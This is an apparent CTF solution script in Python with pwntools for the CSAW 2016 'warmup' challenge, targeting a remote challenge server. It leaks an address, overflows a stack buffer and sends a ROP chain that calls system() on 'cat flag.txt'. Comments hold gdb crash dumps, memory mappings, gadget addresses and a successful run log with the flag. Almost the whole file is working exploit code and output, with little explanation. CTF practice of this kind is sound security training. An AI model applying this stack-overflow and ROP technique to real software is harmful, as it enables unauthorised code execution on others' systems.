#!/usr/bin/env python
from pwn import *

p = process('./warmup') if '--live' not in sys.argv else remote('pwn.chal.csaw.io', 8000)

print p.recvregex('WOW:')
r = '0x([0-9a-f]*)\n'
easy_offset = 0x40060d
easy_leak = int(re.findall(r, p.recvregex(r))[0], 16)

print('easy_leak: %r' % (easy_leak,))
base_delta = easy_offset - easy_leak
print('base_delta: %r' % (base_delta,))


'''
0x0000000000400713 : pop rdi ; ret
0x0000000000400711 : pop rsi ; pop r15 ; ret
'''


more_leak = p.recv(8)
print(repr(more_leak))

#gdb.attach(p)

#p.sendline('A'*(0x80+0x10))

'''
Program received signal SIGSEGV, Segmentation fault.
0x00000000004006a4 in main ()
(gdb) x/10wx $rsp
0x7fff1661bb18: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff1661bb28: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff1661bb38: 0x41414141  0x41414141
(gdb) i r
rax            0x7fff1661bad0   140733568891600
rbx            0x0  0
rcx            0xfbad2088   4222427272
rdx            0x7ff4b218d7b0   140688936720304
rsi            0x7ff4b23ae090   140688938950800
rdi            0x7fff1661bb60   140733568891744
rbp            0x4141414141414141   0x4141414141414141
rsp            0x7fff1661bb18   0x7fff1661bb18
r8             0x7ff4b23ae091   140688938950801
r9             0x4141414141414141   4702111234474983745
r10            0x4141414141414141   4702111234474983745
r11            0x246    582
r12            0x400520 4195616
r13            0x7fff1661bbf0   140733568891888
r14            0x0  0
r15            0x0  0
rip            0x4006a4 0x4006a4 <main+135>
eflags         0x10246  [ PF ZF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
(gdb) info proc maps
Too many parameters: maps
(gdb) info proc mappings
process 16516
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/avi/Documents/csaw_quals_2016_09/warmup
            0x600000           0x601000     0x1000        0x0 /home/avi/Documents/csaw_quals_2016_09/warmup
            0x601000           0x602000     0x1000     0x1000 /home/avi/Documents/csaw_quals_2016_09/warmup
      0x7ff4b1de6000     0x7ff4b1f88000   0x1a2000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ff4b1f88000     0x7ff4b2187000   0x1ff000   0x1a2000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ff4b2187000     0x7ff4b218b000     0x4000   0x1a1000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ff4b218b000     0x7ff4b218d000     0x2000   0x1a5000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ff4b218d000     0x7ff4b2191000     0x4000        0x0 
      0x7ff4b2191000     0x7ff4b21b1000    0x20000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ff4b238c000     0x7ff4b238f000     0x3000        0x0 
      0x7ff4b23ae000     0x7ff4b23b1000     0x3000        0x0 
      0x7ff4b23b1000     0x7ff4b23b2000     0x1000    0x20000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ff4b23b2000     0x7ff4b23b3000     0x1000    0x21000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ff4b23b3000     0x7ff4b23b4000     0x1000        0x0 
      0x7fff165fd000     0x7fff1661e000    0x21000        0x0 [stack]
      0x7fff16751000     0x7fff16753000     0x2000        0x0 [vdso]
      0x7fff16753000     0x7fff16755000     0x2000        0x0 [vvar]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
'''

'''
00000000004004d0 <system@plt>:
  4004d0:       ff 25 4a 0b 20 00       jmpq   *0x200b4a(%rip)        # 601020 <_GLOBAL_OFFSET_TABLE_+0x20>
  4004d6:       68 01 00 00 00          pushq  $0x1
  4004db:       e9 d0 ff ff ff          jmpq   4004b0 <_init+0x28>
'''

'''
 400730 01000200 63617420 666c6167 2e747874  ....cat flag.txt
'''
'''
0x00000000004004a1 : ret
'''
#gdb.attach(p)
import struct
ret = struct.pack('<Q', 0x00000000004004a1)
poprdi = struct.pack('<Q', 0x0000000000400713)
catflag = struct.pack('<Q', 0x400730+4)
system = struct.pack('<Q', 0x00000000004004d0)
p.sendline(ret*(0xa0/8) + poprdi + catflag + system)

print p.recvall()
#p.interactive()

'''
avi@debian:~/Documents/csaw_quals_2016_09$ ./pwn50_warmup_exploit.py --live
[+] Opening connection to pwn.chal.csaw.io on port 8000: Done
-Warm Up-
WOW:
easy_leak: 4195853
base_delta: 0
'>'
[+] Recieving all data: Done (29B)
[*] Closed connection to pwn.chal.csaw.io port 8000
FLAG{LET_US_BEGIN_CSAW_2016}
'''
